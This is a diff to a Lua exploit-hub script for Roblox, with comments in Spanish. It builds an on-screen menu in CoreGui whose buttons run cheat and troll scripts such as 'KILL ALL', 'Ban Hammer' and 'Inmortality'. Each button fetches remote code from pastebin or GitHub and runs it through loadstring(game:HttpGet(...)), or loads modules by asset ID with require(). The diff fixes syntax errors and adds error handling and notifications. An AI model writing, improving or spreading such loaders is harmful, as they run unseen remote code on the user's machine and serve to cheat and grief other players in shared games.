@@ -24,11 +24,13 @@ local scripts = {
     end,
     
     ["c00lguifan"] = function()
-        require(14125553864):Fire("nytrfe_n0official","c00lkidd")
+        pcall(function()
+            require(14125553864):Fire("nytrfe_n0official","c00lkidd")
+        end)
     end,
     
     ["Pastebin Script"] = function()
-        loadstring(game:HttpGet(('https://pastebin.com/raw/9wJepMwY'),true))()
+        loadstring(game:HttpGet('https://pastebin.com/raw/9wJepMwY'))()
     end,
     
     ["VISUAL"] = function()
@@ -36,72 +38,65 @@ local scripts = {
     end,
 
     ["KILL ALL V2 skid"] = function()
-
-loadstring(game:HttpGet("https://pastebin.com/raw/qCx0A5JN"))()
+        loadstring(game:HttpGet("https://pastebin.com/raw/qCx0A5JN"))()
     end,
 
     ["ANTI-EXPLOIT FOR HACKERS"] = function()
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Lukiblokck/My-Roblox-Scripts/refs/heads/main/Anti-Exploit.txt'))()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Lukiblokck/My-Roblox-Scripts/refs/heads/main/Anti-Exploit.txt'))()
     end,
 
     ["c00lkidd_1 song"] = function()
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Lukiblokck/My-Roblox-Scripts/refs/heads/main/mymusic.txt'))()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Lukiblokck/My-Roblox-Scripts/refs/heads/main/mymusic.txt'))()
     end,
 
     ["TROLL SKYBOX XDDDD"] = function()
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Lukiblokck/My-Roblox-Scripts/refs/heads/main/TROLL-SKYBOX.txt'))()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Lukiblokck/My-Roblox-Scripts/refs/heads/main/TROLL-SKYBOX.txt'))()
     end,
 
     ["XK5NG"] = function()
-
-loadstring(game:HttpGet("https://pastebin.com/raw/jew1GJN1"))()
+        loadstring(game:HttpGet("https://pastebin.com/raw/jew1GJN1"))()
     end,
 
     ["CSHub (Mini Hub)"] = function()
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Lukiblokck/My-Roblox-Scripts/refs/heads/main/CSHub-minihub.txt"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Lukiblokck/My-Roblox-Scripts/refs/heads/main/CSHub-minihub.txt"))()
     end,
 
     ["DRESS TO IMPRESS TROLL"] = function()
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/DTI-GUI-V2/main/dti_gui_v2.lua",true))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/DTI-GUI-V2/main/dti_gui_v2.lua"))()
     end,
 
     ["c00lguiTuber93"] = function()
-
-require(6032524768).Eagle('nytrfe_n0offcial')
+        pcall(function()
+            require(6032524768).Eagle('nytrfe_n0offcial')
+        end)
     end,
 
     ["ERMH..."] = function()
-
-loadstring(game:HttpGet("http://raw.githubusercontent.com/Lukiblokck/My-Roblox-Scripts/refs/heads/main/HAHA.txt"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Lukiblokck/My-Roblox-Scripts/refs/heads/main/HAHA.txt"))()
     end,
 
     ["Kill All v3?!?!?!!?!?"] = function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/iz037/Zeld-Hub/main/Loader.lua"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/iz037/Zeld-Hub/main/Loader.lua"))()
     end,
 
     ["Ban Hammer v2?!?!?!?"] = function()
-loadstring(game:HttpGet("https://pastebin.com/raw/FRJ4wpVb"))("Copyright ERROR_CODE ECCS Co")
+        loadstring(game:HttpGet("https://pastebin.com/raw/FRJ4wpVb"))()
     end,
 
-    ["Very Speed Run Tool"]
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Lukiblokck/My-Roblox-Scripts/refs/heads/main/runtool.lua"))()
+    ["Very Speed Run Tool"] = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Lukiblokck/My-Roblox-Scripts/refs/heads/main/runtool.lua"))()
     end,
 
-    ["Inmortality"]
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Lukiblokck/My-Roblox-Scripts/refs/heads/main/inmortal.lua"))()
+    ["Inmortality"] = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Lukiblokck/My-Roblox-Scripts/refs/heads/main/inmortal.lua"))()
     end,
 
-    ["Ban Hammer v3 pls funciona"]
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Lukiblokck/My-Roblox-Scripts/refs/heads/main/banhammerv3.lua"))()
+    ["Ban Hammer v3 pls funciona"] = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Lukiblokck/My-Roblox-Scripts/refs/heads/main/banhammerv3.lua"))()
     end
 }
 
--- interfaz grafica
+-- Interfaz gráfica
 local ScreenGui = Instance.new("ScreenGui")
 local MainFrame = Instance.new("Frame")
 local Title = Instance.new("TextLabel")
@@ -111,7 +106,7 @@ local CloseButton = Instance.new("TextButton")
 local MinimizeButton = Instance.new("TextButton")
 local MinimizedButton = Instance.new("ImageButton")
 
--- prop. interfaz
+-- Propiedades de la interfaz
 ScreenGui.Name = "ScriptSelector"
 ScreenGui.Parent = game.CoreGui
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
@@ -170,7 +165,7 @@ MinimizeButton.Text = "-"
 MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 MinimizeButton.TextSize = 18.000
 
--- cuando ya ta minimizao
+-- Botón minimizado
 MinimizedButton.Name = "MinimizedButton"
 MinimizedButton.Parent = ScreenGui
 MinimizedButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
@@ -203,6 +198,49 @@ MinimizedButton.MouseButton1Click:Connect(function()
     MinimizedButton.Visible = false
 end)
 
+-- Función para ejecutar scripts con manejo de errores
+local function executeScript(scriptName, scriptFunction)
+    local success, error = pcall(scriptFunction)
+    if not success then
+        warn("Error ejecutando " .. scriptName .. ": " .. tostring(error))
+        return false
+    end
+    return true
+end
+
+-- Función para mostrar notificación
+local function showNotification(message, isError)
+    local notification = Instance.new("TextLabel")
+    notification.Name = "Notification"
+    notification.Parent = MainFrame
+    notification.BackgroundColor3 = isError and Color3.fromRGB(180, 40, 40) or Color3.fromRGB(40, 180, 40)
+    notification.BorderSizePixel = 0
+    notification.Position = UDim2.new(0, 0, 1, 0)
+    notification.Size = UDim2.new(1, 0, 0, 30)
+    notification.Font = Enum.Font.SourceSansBold
+    notification.Text = message
+    notification.TextColor3 = Color3.fromRGB(255, 255, 255)
+    notification.TextSize = 16.000
+    
+    -- Animación de aparición
+    local tweenIn = game:GetService("TweenService"):Create(
+        notification,
+        TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        {Position = UDim2.new(0, 0, 1, -30)}
+    )
+    tweenIn:Play()
+    
+    -- Eliminar la notificación después de 2 segundos
+    game:GetService("Debris"):AddItem(notification, 3)
+    wait(2)
+    local tweenOut = game:GetService("TweenService"):Create(
+        notification,
+        TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
+        {Position = UDim2.new(0, 0, 1, 0)}
+    )
+    tweenOut:Play()
+end
+
 -- Añadir scripts al scrolling frame
 local buttonNumber = 0
 for scriptName, scriptFunction in pairs(scripts) do
@@ -217,39 +255,23 @@ for scriptName, scriptFunction in pairs(scripts) do
     ScriptButton.TextColor3 = Color3.fromRGB(255, 255, 255)
     ScriptButton.TextSize = 16.000
     
+    -- Efecto hover
+    ScriptButton.MouseEnter:Connect(function()
+        ScriptButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+    end)
+    
+    ScriptButton.MouseLeave:Connect(function()
+        ScriptButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    end)
+    
     -- Ejecutar el script cuando se hace clic en el botón
     ScriptButton.MouseButton1Click:Connect(function()
-        scriptFunction()
-        -- Notificación de ejecución
-        local notification = Instance.new("TextLabel")
-        notification.Name = "Notification"
-        notification.Parent = MainFrame
-        notification.BackgroundColor3 = Color3.fromRGB(40, 180, 40)
-        notification.BorderSizePixel = 0
-        notification.Position = UDim2.new(0, 0, 1, 0)
-        notification.Size = UDim2.new(1, 0, 0, 30)
-        notification.Font = Enum.Font.SourceSansBold
-        notification.Text = "¡" .. scriptName .. " ejecutado!"
-        notification.TextColor3 = Color3.fromRGB(255, 255, 255)
-        notification.TextSize = 16.000
-        
-        -- Animación de notificación
-        game:GetService("TweenService"):Create(
-            notification,
-            TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-            {Position = UDim2.new(0, 0, 1, -30)}
-        ):Play()
-        
-        -- Eliminar la notificación después de 2 segundos
-        delay(2, function()
-            game:GetService("TweenService"):Create(
-                notification,
-                TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
-                {Position = UDim2.new(0, 0, 1, 0)}
-            ):Play()
-            wait(0.5)
-            notification:Destroy()
-        end)
+        local success = executeScript(scriptName, scriptFunction)
+        if success then
+            showNotification("¡" .. scriptName .. " ejecutado!")
+        else
+            showNotification("Error ejecutando " .. scriptName, true)
+        end
     end)
     
     buttonNumber = buttonNumber + 1
